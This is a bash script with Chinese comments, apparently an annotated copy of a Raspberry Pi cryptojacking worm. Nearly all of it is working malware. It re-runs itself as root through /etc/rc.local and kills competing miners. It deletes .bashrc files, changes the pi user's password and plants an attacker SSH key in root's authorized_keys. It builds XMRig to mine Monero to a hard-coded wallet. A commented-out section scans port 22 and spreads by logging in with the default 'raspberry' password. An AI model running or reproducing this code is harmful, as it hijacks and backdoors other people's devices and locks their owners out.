#!/bin/bash

#echo -----------Start---------------
#echo -----------Phase 1---------------

# 獲得腳本自身的路徑
MYSELF="$(realpath $0)"
# 不輸出訊息
DEBUG=/dev/null
# 將腳本路徑輸出到 DEBUG，實際上不會顯示
echo $MYSELF >> $DEBUG

#  檢查當前用戶是否是 root
if [ "$EUID" -ne 0 ]; then
    ################################################
    # 如果不是 root 用戶，則嘗試以 root 權限重新執行腳本 #
    ################################################
    # 使用 mktemp 命令創建一個臨時檔案的路徑，-u 表示只生成路徑，不創建檔案
    NEWMYSELF=$(mktemp -u /opt/XXXXXXXX)

    # 將腳本複製到上面生成的臨時路徑，即複製到 /opt/ 目錄下，並生成一個隨機的檔案名
    # 在大多數樹莓派配置中（尤其是使用 Raspberry Pi OS 的情況下），預設的 pi 使用者配置為無需密碼即可使用 sudo
    sudo cp "$MYSELF" "$NEWMYSELF"

    # 添加執行權限
    sudo chmod +x "$NEWMYSELF"

    # 用 echo 創建一個新的 /etc/rc.local，這個檔案在系統啟動時會被執行
    # ''#!/bin/sh -e' 是指定腳本的解釋器為 /bin/sh, -e 代表如果命令返回非零退出狀態則立即退出腳本
    sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"

    # 添加這一行: 臨時腳本的路徑，目的為讓系統在下次啟動時自動執行這個臨時腳本
    sudo sh -c "echo '$NEWMYSELF' >> /etc/rc.local"

    # 'exit 0': 確保腳本正常退出
    sudo sh -c "echo 'exit 0' >> /etc/rc.local"
    echo "Script will be re-executed as root after reboot."
    sleep 1
    sudo reboot
else
    # 如果是 root 用戶，繼續執行腳本的其餘部分
    # 創建一個臨時檔案，並將其路徑輸出到 DEBUG
    TMP1=$(mktemp)
    echo $TMP >> $DEBUG

    # 殺死可能與加密挖礦有關的所有行程
    killall bins.sh minerd node nodejs ktx-armv4l ktx-i586 ktx-m68k ktx-mips ktx-mipsel ktx-powerpc ktx-sh4 ktx-sparc arm5 zmap kaiten perl

    # 修改 /etc/hosts 以阻止訪問某個網站
    echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
    rm -rf /root/.bashrc
    rm -rf /home/pi/.bashrc
    
    # 更改密碼
    usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi
    
    # 確保 /root/.ssh 目錄確保存在
    mkdir -p /root/.ssh

    # 添加公鑰到 /root/.ssh/authorized_keys ，允許無密碼 SSH 登錄
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDT7DlC6QJ9i9ZujQqDm2L+w9MKSHpoCr2cEi0EYIGLSxAAvc1sO42ITkZM1DvdUZvmc8cAzCW9x0rWB8acvIJTj+NcOHtwFFQ5240Ikp2+R0fxtGxPJQx1cQUSrCFV2fFE5Rt7VpPC/9zdzBVH8vDNe2E8ZmXW0L6yWR6gvRZ1m57g73Q0gzG31ie8lUVeiHIbuK21d3Yvt54LwXvu4qSaXsdFgodg772ZyDlul8sVvHae7+5Dl6FBTFYlFgCN/jgeMf96IfKDLjVTAqEZvXzR3zNy16dXHvmDb232Tylnhi1+rwoKbvybqDSkaEQEzWGXl7Kgk5ZV76zQa5uiBAF8jNdEF7RvpjjGFW/0H/FbI0xB1fjZjRQqRGRcej+7BnLOWYISN0Pi9835tw6regf/xilrPUBzXot1+CbBYHZ9QZQFdH1Voucm1ooSC1aZpUxt0VJYt0ymK1cWPCleRqvO9YBh0sBEQXsNs2lD4L0WKGfDw/w6a8IO4PSvgbPtc2Z66m8vMHZf8jrpvVHOB9Kw/vbxJfd1AKz6u5h8Aaj/QEIeDo5ru7D1KOOJlQacOsH+R3HKqPb1Bp7C9vhUZAN6VlvvTLJqwPJihh5Tch+UKhHzVngm/gLnEgfZE+/3kBWGZKkciJZLplCk+aNo0A2l/h7zpMDCE1cwijuA5jr74w== chico890921@MSI" >> /root/.ssh/authorized_keys

    # 修改系統的 DNS 服務器為 Google 的 DNS
    echo "nameserver 8.8.8.8" >> /etc/resolv.conf
    rm -rf /tmp/ktx*
    rm -rf /tmp/cpuminuer-multi
    rm -rf /var/tmp/kaiten

    # 下載和安裝加密挖礦的 dependencies
#    echo -----------Phase 2 - Download Dependencies---------------
    apt-get update -y
    apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

    # 下載和編譯 XMRig
#    echo -----------Phase 3 - Install Dependencies---------------
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig || exit
    mkdir -p build && cd build
    cmake ..
    make

    # 配置 XMRig 以使用 RandomX
#    echo -----------Phase 4 - Configure Miner---------------
    # 這裡根據你的具體需求配置 XMRig
    cat >config.json <<EOL
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "gulf.moneroocean.stream:10128",
            "user": "43qhZPhpnGWLZnYD78NXJ48T7GA67TnmB6N4wbFHGuffB6SbK9SVPH9dqSTGbRjiLw6xcdXhonPtBgYHtSy5sQv5JjAJAsm",
            "pass": "x",
            "keepalive": true,
            "algo": null,
            "coin": "monero"
        }
    ]
}
EOL
 

    # 擴散
    
#    echo -----------Phase 5 - Spreading Phase---------------
    # 更新並安裝必要的工具
    # sshpass 用來自動化輸入SSH 密碼
#    apt-get update -y --force-yes

#    sleep 5
#    apt-get install zmap sshpass -y --force-yes

    # 設置一個循環，嘗試傳播 3 次
#    x=1
#    while [ $x -le 3 ]; do
#        sleep 5
        # 使用 zmap 在 22 port 上掃描並輸出結果到臨時檔案
#        FILE=$(mktemp)
#        zmap -p 22 -o $FILE -n 100000

#        sleep 5
        # 終止所有正在執行的 ssh 和 scp 行程，以避免干擾傳播過程
#        killall ssh scp
        # 遍歷掃描結果中的每個 IP 位址
#        for IP in $(cat $FILE); do
            # 嘗試使用 sshpass 和 scp 將本腳本複製到找到的設備上，然後通過 SSH 執行 它
            # 默認密碼是"raspberry"，這假設目標設備是使用默認密碼的樹苺派設備
#            sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/ && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && ./$NAME" &
#        done
        # 刪除臨時檔案
#        rm -rf $FILE
#        sleep 10
#        x=$(( $x + 1 ))
#    done

    # 開始使用 XMRig 挖掘門羅幣
#    echo -----------Phase 6 - Start Miner---------------
    ./xmrig

#    echo -----------End---------------
fi